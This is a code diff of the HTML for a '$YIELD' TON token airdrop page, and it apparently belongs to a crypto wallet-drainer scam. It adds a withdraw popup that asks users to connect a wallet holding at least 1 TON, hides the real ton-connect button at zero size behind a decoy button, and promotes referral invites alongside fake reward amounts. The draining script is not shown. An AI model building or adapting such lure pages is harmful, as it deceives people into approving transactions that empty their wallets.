@@ -5,39 +5,29 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>$YIELD</title>
     <link rel="stylesheet" href="css/styles.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
 </head>
 <body>
 <div class="container">
-
-    <!-- Onboarding overlay старт
-    <div class="onboarding-overlay">
-        <div class="onboarding-container">
-            <h1>Welcome back, username!</h1>
-            <div class="step">
-                <div class="progress-bar"><div class="progress"></div></div>
-                <p>Analyzing your account</p>
-            </div>
-            <div class="step">
-                <div class="progress-bar"><div class="progress"></div></div>
-                <p>Gathering information</p>
-            </div>
-            <div class="step">
-                <div class="progress-bar"><div class="progress"></div></div>
-                <p>Issuance of award</p>
-            </div>
-            <div class="reward">
-                <p>Your Reward — 310 012 $YIELD</p>
-                <button class="collect-button">
-                    <span>Collect your reward</span>
+    <div id="airdrop-page" class="page active">
+        <div id="withdraw-popup" class="popup animate__animated">
+            <div class="popup-content">
+                <span class="close-popup">&times;</span>
+                <h3 class="popup-label">Withdraw $YIELD</h3>
+                <p class="popup-description">
+                    1. Connect your TON Wallet in App<br>
+                    2. Approve your withdraw<br>
+                    3. Receive your airdrop<br>
+                    P.S: Available only for wallets no less 1 TON (network fee)
+                </p>
+                <button id="ton-connect" style="display:none; opacity: 0 !important; height: 0 !important; width: 0 !important;"></button>
+                <button id="not-ton-connect" onclick="openButton()" class="connect-wallet-button">
+                    <img src="img/wallet-icon.svg" alt="Connect Wallet" class="wallet-icon">
+                    <span>Connect Wallet</span>
                 </button>
             </div>
         </div>
-    </div>-->
-    <!-- Onboarding overlay энд -->
 
-
-    <div id="airdrop-page" class="page active">
         <div class="yield-text">$YIELD</div>
         <div class="amount">0</div>
         <div class="usd-value">~ 0 USD</div>
@@ -50,19 +40,29 @@
             <img src="img/info-icon.svg" alt="Info" class="info-icon">
             Withdrawals will be available after the timer expires
         </div>
+
+        <div class="info-banner">
+            <h3 class="info-banner-label">Invite your friends</h3>
+            <p class="info-banner-description">Invite your friends and get rewarded for it! The more friends you have, the more $YIELD you will get.</p>
+        </div>
+
+
     </div>
     <div id="invites-page" class="page">
         <h1 class="invited-friends">0</h1>
         <h2 class="invited-friends-label">Invited friends</h2>
-        <p class="invite-info">Invite your friends to participate in Airdrop and get $YIELD 125,000 reward for each!</p>
+        <p class="invite-info">Invite your friends to participate in Airdrop and get $YIELD 5,000 reward for each!</p>
         <div class="invite-button">
             <img src="img/add-person-icon.svg" alt="Invite" class="invite-icon">
             <span>Invite a friend</span>
         </div>
+
         <div class="copy-link-button">
             <img src="img/share-icon.svg" alt="Copy" class="copy-icon">
+            <img src="img/check-icon.svg" alt="Copied" class="check-icon" style="display: none;">
             <span>Copy invite link</span>
         </div>
+
         <h3 class="invitation-list-title">Invitation list</h3>
         <div class="invitation-list">
 
